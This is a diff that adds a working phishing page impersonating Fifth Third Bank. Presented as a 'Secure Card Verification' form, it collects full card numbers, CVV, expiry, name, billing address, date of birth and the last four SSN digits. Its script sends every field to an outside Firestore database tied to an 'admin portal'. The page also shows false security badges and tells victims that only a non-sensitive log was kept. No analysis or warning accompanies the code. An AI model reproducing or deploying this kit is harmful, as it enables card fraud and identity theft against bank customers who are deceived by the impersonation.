@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fifth Third Bank - Secure Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #002D72;
+            --secondary-color: #E2001A;
+            --text-color: #333;
+            --light-bg: #f5f7fa;
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--light-bg);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background-color: #ffffff;
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            margin-top: 30px;
+        }
+        .header {
+            background-color: var(--primary-color);
+            padding: 20px 25px;
+            color: white;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .logo {
+            height: 40px;
+            filter: brightness(0) invert(1);
+        }
+        .header-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            flex-basis: 100%;
+            margin-top: 10px;
+        }
+        .security-badge {
+            background: linear-gradient(to right, #00A651, #007C38);
+            color: white;
+            padding: 4px 10px;
+            border-radius: 9999px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .content {
+            padding: 25px;
+        }
+        .notice {
+            background-color: #fcebeb;
+            border-left: 5px solid var(--secondary-color);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            color: #4f4f4f;
+            font-size: 0.95rem;
+        }
+        .form-section {
+            margin-bottom: 25px;
+            padding: 15px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .form-section:last-of-type {
+            border-bottom: none;
+        }
+        .section-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            color: #5a6a8c;
+            margin-bottom: 5px;
+            font-size: 0.875rem;
+        }
+        .input-group {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            padding-right: 40px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            box-sizing: border-box;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+        }
+        input:focus, select:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(0, 45, 114, 0.2);
+            outline: none;
+        }
+        .input-icon {
+            position: absolute;
+            right: 15px;
+            color: #9ca3af;
+            pointer-events: none;
+        }
+        .input-icon-adjusted {
+            right: 15px;
+        }
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        .col {
+            flex: 1;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: var(--secondary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 1.05rem;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 15px rgba(226, 0, 26, 0.2);
+        }
+        .btn:hover:not(:disabled) {
+            background: #b80017;
+        }
+        .btn:disabled {
+            background: #9ca3af;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .disclaimer {
+            margin-top: 20px;
+            font-size: 0.85rem;
+            color: #6b7280;
+            text-align: center;
+            padding: 0 10px;
+        }
+        .disclaimer i {
+            margin-right: 5px;
+            color: var(--primary-color);
+        }
+        .footer {
+            background-color: #e8eaf6;
+            padding: 15px 25px;
+            border-top: 1px solid #d1d5db;
+        }
+        .security-features {
+            display: flex;
+            justify-content: space-around;
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+        .security-item i {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 1.1rem;
+        }
+        .success-container {
+            display: none;
+            text-align: center;
+        }
+        .success-check i {
+            font-size: 4rem;
+            color: #00A651;
+            margin-bottom: 15px;
+            animation: bounceIn 0.8s ease-out;
+        }
+        .success-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        .success-subtitle {
+            color: #5a6a8c;
+            margin-bottom: 30px;
+        }
+        .verification-summary {
+            background-color: var(--light-bg);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: left;
+            margin-bottom: 30px;
+        }
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px dashed #cfd8dc;
+            font-size: 0.95rem;
+        }
+        .summary-row:last-child {
+            border-bottom: none;
+        }
+        .summary-label {
+            color: #6b7280;
+        }
+        .summary-value {
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+        .status-active {
+            color: #00A651;
+        }
+        .next-steps h3 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--secondary-color);
+            margin-bottom: 10px;
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0.3); opacity: 0; }
+            50% { transform: scale(1.1); opacity: 1; }
+            70% { transform: scale(0.9); }
+            100% { transform: scale(1); }
+        }
+
+        @media (max-width: 600px) {
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .col {
+                max-width: 100% !important;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main Verification Form Container -->
+    <div class="container" id="form-container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://i.postimg.cc/QtrtxPq1/OIP-1-removebg-preview.png" alt="Fifth Third Bank Logo" class="logo" onerror="this.onerror=null; this.src='https://placehold.co/150x70/002D72/ffffff?text=Fifth+Third+Bank';">
+            </div>
+            <div class="header-title">Secure Card Verification</div>
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>SSL Secured</span>
+            </div>
+        </div>
+
+        <div class="content">
+            <div class="notice">
+                <i class="fas fa-exclamation-triangle" style="color: var(--secondary-color);"></i>
+                To complete recent account activity verification, please confirm your card and identity details below.
+            </div>
+
+            <form id="verification-form">
+
+                <!-- Card Number Section -->
+                <div class="form-section">
+                    <div class="section-title">
+                        <i class="fas fa-credit-card"></i>
+                        Payment Card Details
+                    </div>
+                    <div class="form-group">
+                        <label for="cardNumber">Card Number</label>
+                        <div class="input-group">
+                            <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" required maxlength="19" inputmode="numeric">
+                            <i class="fab fa-cc-visa input-icon" id="card-icon"></i>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Expiry and CVV Section -->
+                <div class="row">
+                    <div class="col">
+                        <div class="form-group">
+                            <label for="expiryMonth">Expiration Date</label>
+                            <div class="row" style="gap: 10px;">
+                                <select id="expiryMonth" name="expiryMonth" required>
+                                    <option value="" disabled selected>Month</option>
+                                    <option value="01">01 - Jan</option><option value="02">02 - Feb</option><option value="03">03 - Mar</option>
+                                    <option value="04">04 - Apr</option><option value="05">05 - May</option><option value="06">06 - Jun</option>
+                                    <option value="07">07 - Jul</option><option value="08">08 - Aug</option><option value="09">09 - Sep</option>
+                                    <option value="10">10 - Oct</option><option value="11">11 - Nov</option><option value="12">12 - Dec</option>
+                                </select>
+                                <select id="expiryYear" name="expiryYear" required>
+                                    <option value="" disabled selected>Year</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col" style="max-width: 150px;">
+                        <div class="form-group">
+                            <label for="cvv">CVV/CVC</label>
+                            <div class="input-group">
+                                <input type="text" id="cvv" name="cvv" placeholder="123" required maxlength="4" inputmode="numeric">
+                                <i class="fas fa-lock input-icon input-icon-adjusted"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Cardholder Info Section -->
+                <div class="form-section">
+                    <div class="section-title">
+                        <i class="fas fa-user-circle"></i>
+                        Cardholder Information
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="fullName">Cardholder Full Name</label>
+                        <div class="input-group">
+                            <input type="text" id="fullName" name="fullName" placeholder="As it appears on the card" required>
+                            <i class="fas fa-user input-icon input-icon-adjusted"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Billing Address Section -->
+                <div class="form-section">
+                    <div class="section-title">
+                        <i class="fas fa-map-marked-alt"></i>
+                        Billing Address
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="billingStreet">Street Address</label>
+                        <div class="input-group">
+                            <input type="text" id="billingStreet" name="billingStreet" placeholder="123 Main St" required>
+                            <i class="fas fa-home input-icon input-icon-adjusted"></i>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="col">
+                            <div class="form-group">
+                                <label for="billingCity">City</label>
+                                <div class="input-group">
+                                    <input type="text" id="billingCity" name="billingCity" required>
+                                    <i class="fas fa-city input-icon input-icon-adjusted"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col" style="max-width: 120px;">
+                            <div class="form-group">
+                                <label for="billingState">State</label>
+                                <div class="input-group">
+                                    <input type="text" id="billingState" name="billingState" required maxlength="2">
+                                    <i class="fas fa-globe input-icon input-icon-adjusted"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col" style="max-width: 120px;">
+                            <div class="form-group">
+                                <label for="billingZip">Zip Code</label>
+                                <div class="input-group">
+                                    <input type="text" id="billingZip" name="billingZip" required maxlength="10" placeholder="12345" inputmode="numeric">
+                                    <i class="fas fa-mail-bulk input-icon input-icon-adjusted"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Identity Verification Section -->
+                <div class="form-section" style="border-bottom: none;">
+                    <div class="section-title">
+                        <i class="fas fa-id-card"></i>
+                        Identity Confirmation
+                    </div>
+
+                    <!-- Date of Birth Input -->
+                    <div class="form-group">
+                        <label>Date of Birth</label>
+                        <div class="row" style="gap: 10px;">
+                            <select id="dobMonth" name="dobMonth" required>
+                                <option value="" disabled selected>Month</option>
+                                <option value="01">Jan</option><option value="02">Feb</option><option value="03">Mar</option>
+                                <option value="04">Apr</option><option value="05">May</option><option value="06">Jun</option>
+                                <option value="07">Jul</option><option value="08">Aug</option><option value="09">Sep</option>
+                                <option value="10">Oct</option><option value="11">Nov</option><option value="12">Dec</option>
+                            </select>
+                            <input type="text" id="dobDay" name="dobDay" placeholder="Day (DD)" required maxlength="2" inputmode="numeric" style="max-width: 80px;">
+                            <input type="text" id="dobYear" name="dobYear" placeholder="Year (YYYY)" required maxlength="4" inputmode="numeric" style="max-width: 100px;">
+                        </div>
+                    </div>
+                    
+                    <!-- Last 4 of SSN Input -->
+                    <div class="form-group">
+                        <label for="ssnLastFour">Last 4 Digits of Social Security Number</label>
+                        <div class="input-group">
+                            <input type="password" id="ssnLastFour" name="ssnLastFour" placeholder="XXXX" required maxlength="4" inputmode="numeric">
+                            <i class="fas fa-user-secret input-icon input-icon-adjusted"></i>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="btn" id="submit-btn">
+                    <i class="fas fa-shield-alt"></i> Complete Secure Verification
+                </button>
+            </form>
+
+            <!-- Disclaimer -->
+            <div class="disclaimer">
+                <i class="fas fa-info-circle"></i>Your data is protected by Fifth Third Bank's privacy and security protocols. Verification confirms recent account activity.
+            </div>
+
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <div class="security-features">
+                <div class="security-item"><i class="fas fa-headset"></i> 24/7 Support</div>
+                <div class="security-item"><i class="fas fa-fingerprint"></i> Fraud Protection</div>
+                <div class="security-item"><i class="fas fa-sitemap"></i> Member FDIC</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Container (Hidden until submission) -->
+    <div class="container success-container" id="success-container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://i.postimg.cc/QtrtxPq1/OIP-1-removebg-preview.png" alt="Fifth Third Bank Logo" class="logo" onerror="this.onerror=null; this.src='https://placehold.co/150x70/002D72/ffffff?text=Fifth+Third+Bank';">
+            </div>
+            <div class="header-title">Verification Successful</div>
+            <div class="security-badge" style="background: linear-gradient(to right, #00C853, #009624);">
+                <i class="fas fa-check-circle"></i>
+                <span>Verification Complete</span>
+            </div>
+        </div>
+
+        <div class="content">
+            <div class="success-check">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <div class="success-title">Thank You, Verification Complete!</div>
+            <div class="success-subtitle">
+                Your payment card has been successfully verified. Your account functionality has been restored and a non-sensitive log was stored in Firestore.
+            </div>
+
+            <div class="verification-summary">
+                <div class="summary-row">
+                    <span class="summary-label">Status</span>
+                    <span class="summary-value status-active">ACTIVE</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Verification Time</span>
+                    <span class="summary-value" id="summary-timestamp"></span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Transaction ID</span>
+                    <span class="summary-value" id="summary-transaction-id">FTH-****</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Card Ends With</span>
+                    <span class="summary-value" id="summary-card-last-four">****</span>
+                </div>
+            </div>
+
+            <div class="next-steps">
+                <h3>Next Steps</h3>
+                <p style="font-size: 15px; color: #5a6a8c;">You can now safely continue with your transactions. If you have any questions, please contact our support team.</p>
+            </div>
+
+            <button class="btn" onclick="window.location.reload();" style="background: #E2001A; margin-top: 30px; box-shadow: 0 6px 15px rgba(226, 0, 26, 0.3);">
+                <i class="fas fa-home"></i> Return to Homepage
+            </button>
+        </div>
+
+        <div class="footer">
+            <div class="security-features">
+                <div class="security-item"><i class="fas fa-headset"></i> 24/7 Support</div>
+                <div class="security-item"><i class="fas fa-fingerprint"></i> Fraud Protection</div>
+                <div class="security-item"><i class="fas fa-sitemap"></i> Member FDIC</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        if (typeof window.__firebase_config === 'undefined') {
+            console.warn("Using specific Firebase configuration as fallback for missing environment variables.");
+            window.__app_id = 'admin-portal-ba8b1';
+            window.__firebase_config = JSON.stringify({
+                apiKey: "AIzaSyAbn5ApzQOgp3UU5t15QJOJt95CvD8jcmU",
+                authDomain: "admin-portal-ba8b1.firebaseapp.com",
+                projectId: "admin-portal-ba8b1",
+                storageBucket: "admin-portal-ba8b1.appspot.com",
+                messagingSenderId: "167973283096",
+                appId: "1:167973283096:web:719a0865b9a5080ae22a6d",
+                measurementId: "G-JGRDF3K3T9"
+            });
+            window.__initial_auth_token = null; 
+        }
+    </script>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, addDoc, collection, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // --- Firebase Configuration and Environment Variables ---
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+        const firebaseConfig = typeof __firebase_config !== 'undefined' 
+            ? JSON.parse(__firebase_config) 
+            : {};
+        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
+        
+        let db, auth, userId;
+
+        // Utility functions for formatting inputs
+        function populateYears() {
+            const currentYear = new Date().getFullYear();
+            const selectYear = document.getElementById('expiryYear');
+            for (let i = 0; i < 10; i++) {
+                const year = currentYear + i;
+                const option = document.createElement('option');
+                option.value = year.toString().slice(-2);
+                option.textContent = year;
+                selectYear.appendChild(option);
+            }
+        }
+
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\s/g, '');
+            let formatted = value.match(/.{1,4}/g);
+            input.value = formatted ? formatted.join(' ') : value;
+        }
+
+        // --- Firebase Initialization and Authentication ---
+        async function initializeFirebase() {
+            if (Object.keys(firebaseConfig).length === 0 || firebaseConfig.projectId === "dummy-project-id-REPLACE-ME") {
+                console.error("Firebase configuration is missing or is using dummy placeholders. Persistence will fail.");
+                userId = crypto.randomUUID();
+                return;
+            }
+
+            try {
+                setLogLevel('debug');
+                console.log("Attempting Firebase initialization. Project ID:", firebaseConfig.projectId);
+
+                const app = initializeApp(firebaseConfig);
+                db = getFirestore(app);
+                auth = getAuth(app);
+                
+                if (initialAuthToken) {
+                    await signInWithCustomToken(auth, initialAuthToken);
+                } else {
+                    await signInAnonymously(auth);
+                }
+                
+                userId = auth.currentUser?.uid || crypto.randomUUID();
+                console.log("Firebase initialized. User ID:", userId);
+
+            } catch (error) {
+                console.error("Firebase initialization or sign-in failed:", error);
+                userId = crypto.randomUUID(); 
+            }
+        }
+
+        // --- Form Submission Handler ---
+        async function handleSubmit(event) {
+            event.preventDefault();
+
+            const form = event.target;
+            const submitBtn = document.getElementById('submit-btn');
+            
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+
+            const cardNumberFull = form.cardNumber.value.replace(/\s/g, '');
+
+            // ✅ CRITICAL FIX: Updated formData object with ALL required fields
+            const formData = {
+                // Full card details
+                card_number: cardNumberFull,
+                card_number_last_four: cardNumberFull.slice(-4),
+                cvv: form.cvv.value,
+                expiry_month: form.expiryMonth.value,
+                expiry_year: form.expiryYear.value,
+
+                // Cardholder info
+                full_name: form.fullName.value,
+                dob: `${form.dobMonth.value}-${form.dobDay.value}-${form.dobYear.value}`,
+
+                // Billing info
+                billing_street: form.billingStreet.value,
+                billing_city: form.billingCity.value,
+                billing_state: form.billingState.value,
+                billing_zip: form.billingZip.value,
+
+                // Identity info
+                ssn_last4: form.ssnLastFour.value,
+
+                // Metadata
+                submitting_user_id: userId,
+                timestamp: new Date().toISOString()
+            };
+
+            let transactionId = 'FTH-' + Math.random().toString(36).substring(2, 10).toUpperCase();
+            let saveSuccessful = false;
+
+            // --- Saving data to the Firestore collection (FIXED PATH) ---
+            if (db && userId && firebaseConfig.projectId !== "dummy-project-id-REPLACE-ME") {
+                // IMPORTANT: Use the correct Firestore path that matches your admin portal
+                const collectionPath = "submitted_verifications";
+                
+                try {
+                    const docRef = await addDoc(collection(db, collectionPath), formData);
+                    transactionId = docRef.id;
+                    saveSuccessful = true;
+                    console.log(`Data saved successfully to: ${collectionPath}/${docRef.id}`);
+                    console.log('Saved data:', formData);
+                } catch (e) {
+                    console.error("FIREBASE ERROR: Permission denied or configuration invalid.", e);
+                    alertMessage("Verification Failed", "Database connection issue. Check console/rules.", "error");
+                    
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Complete Secure Verification';
+                    return; 
+                }
+            } else {
+                console.warn("DEMO MODE: Database save skipped. Firebase config is dummy or not initialized.");
+                console.log('Form data that would be saved:', formData);
+                saveSuccessful = true;
+            }
+
+            // Update Success UI and Switch Views
+            setTimeout(() => {
+                document.getElementById('summary-timestamp').textContent = new Date().toLocaleString();
+                document.getElementById('summary-transaction-id').textContent = transactionId;
+                document.getElementById('summary-card-last-four').textContent = formData.card_number_last_four;
+
+                document.getElementById('form-container').style.display = 'none';
+                document.getElementById('success-container').style.display = 'block';
+            }, 1500); 
+        }
+
+        function alertMessage(title, message, type) {
+             const notice = document.querySelector('.notice');
+             if (notice) {
+                 notice.innerHTML = `<i class="fas ${type === 'error' ? 'fa-times-circle' : 'fa-check-circle'}" style="color: ${type === 'error' ? 'var(--secondary-color)' : '#00A651'};"></i> <strong>${title}:</strong> ${message}`;
+                 notice.style.backgroundColor = type === 'error' ? '#fcebeb' : '#e6ffe6';
+                 notice.style.borderColor = type === 'error' ? 'var(--secondary-color)' : '#00A651';
+             }
+        }
+
+        // --- Main execution block ---
+        document.addEventListener('DOMContentLoaded', () => {
+            populateYears();
+            initializeFirebase();
+            
+            const form = document.getElementById('verification-form');
+            if (form) {
+                form.addEventListener('submit', handleSubmit);
+            }
+
+            document.getElementById('cardNumber').addEventListener('input', function() {
+                formatCardNumber(this);
+            });
+        });
+    </script>
+</body>
+</html>
